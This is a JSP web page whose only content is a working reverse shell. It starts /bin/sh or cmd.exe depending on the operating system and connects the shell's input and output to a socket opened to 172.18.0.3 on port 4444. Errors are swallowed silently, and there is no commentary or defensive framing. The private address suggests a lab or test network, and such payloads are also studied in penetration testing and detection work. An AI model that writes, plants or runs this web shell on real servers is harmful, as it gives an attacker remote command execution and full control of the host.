<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream ib;
    OutputStream ti;

    StreamConnector( InputStream ib, OutputStream ti )
    {
      this.ib = ib;
      this.ti = ti;
    }

    public void run()
    {
      BufferedReader bt  = null;
      BufferedWriter irs = null;
      try
      {
        bt  = new BufferedReader( new InputStreamReader( this.ib ) );
        irs = new BufferedWriter( new OutputStreamWriter( this.ti ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = bt.read( buffer, 0, buffer.length ) ) > 0 )
        {
          irs.write( buffer, 0, length );
          irs.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( bt != null )
          bt.close();
        if( irs != null )
          irs.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}

    Socket socket = new Socket( "172.18.0.3", 4444 );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>

